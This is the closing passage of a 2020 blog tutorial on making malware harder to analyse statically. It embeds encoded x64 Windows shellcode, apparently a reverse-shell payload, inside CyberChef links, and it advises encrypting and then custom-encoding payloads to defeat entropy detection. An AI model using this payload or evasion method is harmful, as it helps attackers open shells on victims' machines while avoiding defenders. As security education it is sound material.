g0MVx4YmFceGE2XHg5NVx4YmRceDlkXHhmZlx4ZDVceDQ4XHg4M1x4YzRceDI4XHgzY1x4MDZceDdjXHgwYVx4ODBceGZiXHhlMFx4NzVceDA1XHhiYlx4NDdceDEzXHg3Mlx4NmZceDZhXHgwMFx4NTlceDQxXHg4OVx4ZGFceGZmXHhkNQ">AES-encrypted</a>,
<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('%5C%5Cx')Gzip('Dynamic%20Huffman%20Coding','','',false)Entropy('Shannon%20scale')&amp;input=XHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjMFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDhiXHg4MFx4ODhceDAwXHgwMFx4MDBceDQ4XHg4NVx4YzBceDc0XHg2N1x4NDhceDAxXHhkMFx4NTBceDhiXHg0OFx4MThceDQ0XHg4Ylx4NDBceDIwXHg0OVx4MDFceGQwXHhlM1x4NTZceDQ4XHhmZlx4YzlceDQxXHg4Ylx4MzRceDg4XHg0OFx4MDFceGQ2XHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceDM4XHhlMFx4NzVceGYxXHg0Y1x4MDNceDRjXHgyNFx4MDhceDQ1XHgzOVx4ZDFceDc1XHhkOFx4NThceDQ0XHg4Ylx4NDBceDI0XHg0OVx4MDFceGQwXHg2Nlx4NDFceDhiXHgwY1x4NDhceDQ0XHg4Ylx4NDBceDFjXHg0OVx4MDFceGQwXHg0MVx4OGJceDA0XHg4OFx4NDhceDAxXHhkMFx4NDFceDU4XHg0MVx4NThceDVlXHg1OVx4NWFceDQxXHg1OFx4NDFceDU5XHg0MVx4NWFceDQ4XHg4M1x4ZWNceDIwXHg0MVx4NTJceGZmXHhlMFx4NThceDQxXHg1OVx4NWFceDQ4XHg4Ylx4MTJceGU5XHg1N1x4ZmZceGZmXHhmZlx4NWRceDQ5XHhiZVx4NzdceDczXHgzMlx4NWZceDMzXHgzMlx4MDBceDAwXHg0MVx4NTZceDQ5XHg4OVx4ZTZceDQ4XHg4MVx4ZWNceGEwXHgwMVx4MDBceDAwXHg0OVx4ODlceGU1XHg0OVx4YmNceDAyXHgwMFx4MTFceDVjXHgwMFx4MDBceDAwXHgwMFx4NDFceDU0XHg0OVx4ODlceGU0XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceDRjXHg4OVx4ZWFceDY4XHgwMVx4MDFceDAwXHgwMFx4NTlceDQxXHhiYVx4MjlceDgwXHg2Ylx4MDBceGZmXHhkNVx4NTBceDUwXHg0ZFx4MzFceGM5XHg0ZFx4MzFceGMwXHg0OFx4ZmZceGMwXHg0OFx4ODlceGMyXHg0OFx4ZmZceGMwXHg0OFx4ODlceGMxXHg0MVx4YmFceGVhXHgwZlx4ZGZceGUwXHhmZlx4ZDVceDQ4XHg4OVx4YzdceDZhXHgxMFx4NDFceDU4XHg0Y1x4ODlceGUyXHg0OFx4ODlceGY5XHg0MVx4YmFceGMyXHhkYlx4MzdceDY3XHhmZlx4ZDVceDQ4XHgzMVx4ZDJceDQ4XHg4OVx4ZjlceDQxXHhiYVx4YjdceGU5XHgzOFx4ZmZceGZmXHhkNVx4NGRceDMxXHhjMFx4NDhceDMxXHhkMlx4NDhceDg5XHhmOVx4NDFceGJhXHg3NFx4ZWNceDNiXHhlMVx4ZmZceGQ1XHg0OFx4ODlceGY5XHg0OFx4ODlceGM3XHg0MVx4YmFceDc1XHg2ZVx4NGRceDYxXHhmZlx4ZDVceDQ4XHg4MVx4YzRceGEwXHgwMlx4MDBceDAwXHg0OVx4YjhceDYzXHg2ZFx4NjRceDAwXHgwMFx4MDBceDAwXHgwMFx4NDFceDUwXHg0MVx4NTBceDQ4XHg4OVx4ZTJceDU3XHg1N1x4NTdceDRkXHgzMVx4YzBceDZhXHgwZFx4NTlceDQxXHg1MFx4ZTJceGZjXHg2Nlx4YzdceDQ0XHgyNFx4NTRceDAxXHgwMVx4NDhceDhkXHg0NFx4MjRceDE4XHhjNlx4MDBceDY4XHg0OFx4ODlceGU2XHg1Nlx4NTBceDQxXHg1MFx4NDFceDUwXHg0MVx4NTBceDQ5XHhmZlx4YzBceDQxXHg1MFx4NDlceGZmXHhjOFx4NGRceDg5XHhjMVx4NGNceDg5XHhjMVx4NDFceGJhXHg3OVx4Y2NceDNmXHg4Nlx4ZmZceGQ1XHg0OFx4MzFceGQyXHg0OFx4ZmZceGNhXHg4Ylx4MGVceDQxXHhiYVx4MDhceDg3XHgxZFx4NjBceGZmXHhkNVx4YmJceGYwXHhiNVx4YTJceDU2XHg0MVx4YmFceGE2XHg5NVx4YmRceDlkXHhmZlx4ZDVceDQ4XHg4M1x4YzRceDI4XHgzY1x4MDZceDdjXHgwYVx4ODBceGZiXHhlMFx4NzVceDA1XHhiYlx4NDdceDEzXHg3Mlx4NmZceDZhXHgwMFx4NTlceDQxXHg4OVx4ZGFceGZmXHhkNQ">GZIP-compressed</a> and
<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('%5C%5Cx')To_Base64('A-Za-z0-9%2B/%3D')Entropy('Shannon%20scale')&amp;input=XHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjMFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDhiXHg4MFx4ODhceDAwXHgwMFx4MDBceDQ4XHg4NVx4YzBceDc0XHg2N1x4NDhceDAxXHhkMFx4NTBceDhiXHg0OFx4MThceDQ0XHg4Ylx4NDBceDIwXHg0OVx4MDFceGQwXHhlM1x4NTZceDQ4XHhmZlx4YzlceDQxXHg4Ylx4MzRceDg4XHg0OFx4MDFceGQ2XHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceDM4XHhlMFx4NzVceGYxXHg0Y1x4MDNceDRjXHgyNFx4MDhceDQ1XHgzOVx4ZDFceDc1XHhkOFx4NThceDQ0XHg4Ylx4NDBceDI0XHg0OVx4MDFceGQwXHg2Nlx4NDFceDhiXHgwY1x4NDhceDQ0XHg4Ylx4NDBceDFjXHg0OVx4MDFceGQwXHg0MVx4OGJceDA0XHg4OFx4NDhceDAxXHhkMFx4NDFceDU4XHg0MVx4NThceDVlXHg1OVx4NWFceDQxXHg1OFx4NDFceDU5XHg0MVx4NWFceDQ4XHg4M1x4ZWNceDIwXHg0MVx4NTJceGZmXHhlMFx4NThceDQxXHg1OVx4NWFceDQ4XHg4Ylx4MTJceGU5XHg1N1x4ZmZceGZmXHhmZlx4NWRceDQ5XHhiZVx4NzdceDczXHgzMlx4NWZceDMzXHgzMlx4MDBceDAwXHg0MVx4NTZceDQ5XHg4OVx4ZTZceDQ4XHg4MVx4ZWNceGEwXHgwMVx4MDBceDAwXHg0OVx4ODlceGU1XHg0OVx4YmNceDAyXHgwMFx4MTFceDVjXHgwMFx4MDBceDAwXHgwMFx4NDFceDU0XHg0OVx4ODlceGU0XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceDRjXHg4OVx4ZWFceDY4XHgwMVx4MDFceDAwXHgwMFx4NTlceDQxXHhiYVx4MjlceDgwXHg2Ylx4MDBceGZmXHhkNVx4NTBceDUwXHg0ZFx4MzFceGM5XHg0ZFx4MzFceGMwXHg0OFx4ZmZceGMwXHg0OFx4ODlceGMyXHg0OFx4ZmZceGMwXHg0OFx4ODlceGMxXHg0MVx4YmFceGVhXHgwZlx4ZGZceGUwXHhmZlx4ZDVceDQ4XHg4OVx4YzdceDZhXHgxMFx4NDFceDU4XHg0Y1x4ODlceGUyXHg0OFx4ODlceGY5XHg0MVx4YmFceGMyXHhkYlx4MzdceDY3XHhmZlx4ZDVceDQ4XHgzMVx4ZDJceDQ4XHg4OVx4ZjlceDQxXHhiYVx4YjdceGU5XHgzOFx4ZmZceGZmXHhkNVx4NGRceDMxXHhjMFx4NDhceDMxXHhkMlx4NDhceDg5XHhmOVx4NDFceGJhXHg3NFx4ZWNceDNiXHhlMVx4ZmZceGQ1XHg0OFx4ODlceGY5XHg0OFx4ODlceGM3XHg0MVx4YmFceDc1XHg2ZVx4NGRceDYxXHhmZlx4ZDVceDQ4XHg4MVx4YzRceGEwXHgwMlx4MDBceDAwXHg0OVx4YjhceDYzXHg2ZFx4NjRceDAwXHgwMFx4MDBceDAwXHgwMFx4NDFceDUwXHg0MVx4NTBceDQ4XHg4OVx4ZTJceDU3XHg1N1x4NTdceDRkXHgzMVx4YzBceDZhXHgwZFx4NTlceDQxXHg1MFx4ZTJceGZjXHg2Nlx4YzdceDQ0XHgyNFx4NTRceDAxXHgwMVx4NDhceDhkXHg0NFx4MjRceDE4XHhjNlx4MDBceDY4XHg0OFx4ODlceGU2XHg1Nlx4NTBceDQxXHg1MFx4NDFceDUwXHg0MVx4NTBceDQ5XHhmZlx4YzBceDQxXHg1MFx4NDlceGZmXHhjOFx4NGRceDg5XHhjMVx4NGNceDg5XHhjMVx4NDFceGJhXHg3OVx4Y2NceDNmXHg4Nlx4ZmZceGQ1XHg0OFx4MzFceGQyXHg0OFx4ZmZceGNhXHg4Ylx4MGVceDQxXHhiYVx4MDhceDg3XHgxZFx4NjBceGZmXHhkNVx4YmJceGYwXHhiNVx4YTJceDU2XHg0MVx4YmFceGE2XHg5NVx4YmRceDlkXHhmZlx4ZDVceDQ4XHg4M1x4YzRceDI4XHgzY1x4MDZceDdjXHgwYVx4ODBceGZiXHhlMFx4NzVceDA1XHhiYlx4NDdceDEzXHg3Mlx4NmZceDZhXHgwMFx4NTlceDQxXHg4OVx4ZGFceGZmXHhkNQ">Base64-encoded</a>.
So to defeat basic entropy analysis we could encrypt and then encode the
 data/payload using for example a custom variation of Base64 (or Base62 
or any other - entropy of BaseN encoded data will be roughly equal to 
log<sub>2</sub>(N) ).</p>

<h2 id="summary">Summary</h2>

<p>We’ve gone through some techniques that can be used to make the 
static analysis of our malicious application slightly harder, mainly 
focusing on PE format and common indicators.</p>

<p>In the next article we will talk about other tricks used to further obfuscate malware.</p>

  </div>

  <div class="date">
    Written on August  4, 2020
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        <footer class="footer">
          



<a href="https://github.com/0xPat"><i class="svg-icon github"></i></a>

<a href="https://www.linkedin.com/in/patryk-czeczko"><i class="svg-icon linkedin"></i></a>


<a href="https://www.twitter.com/0xPat"><i class="svg-icon twitter"></i></a>



        </footer>
      </div>
    </div>

    

  

</body></html>